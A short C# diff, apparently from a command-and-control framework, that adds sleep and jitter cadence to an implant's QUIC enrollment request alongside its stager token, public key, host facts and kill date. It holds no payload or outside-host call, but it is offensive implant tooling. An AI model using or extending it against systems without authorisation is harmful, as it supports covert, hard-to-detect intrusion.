@@ -61,8 +61,8 @@ internal static class QuicEnroll
             // The enroll body, promoted into the frame grammar (extending/
             // implants.md): token secret, class, the implant's public key
             // (DER SubjectPublicKeyInfo -- only the public half crosses),
-            // parent, host facts, kill date. The profile's malleable HTTP
-            // knobs do not apply -- the exchange is frames under TLS 1.3.
+            // parent, host facts, cadence, kill date. The profile's malleable
+            // HTTP knobs do not apply -- the exchange is frames under TLS 1.3.
             var request = new Rod.V1.EnrollRequest
             {
                 StagerTokenSecret = dial.StagerToken,
@@ -75,6 +75,10 @@ internal static class QuicEnroll
                 Username = dial.Host?.Username ?? string.Empty,
                 KillDate = dial.KillDate ?? string.Empty,
             };
+            if (dial.SleepSeconds is { } sleep)
+                request.SleepSeconds = sleep;
+            if (dial.JitterSeconds is { } jitter)
+                request.JitterSeconds = jitter;
             await wire.WriteFramesAsync(
                 new[]
                 {
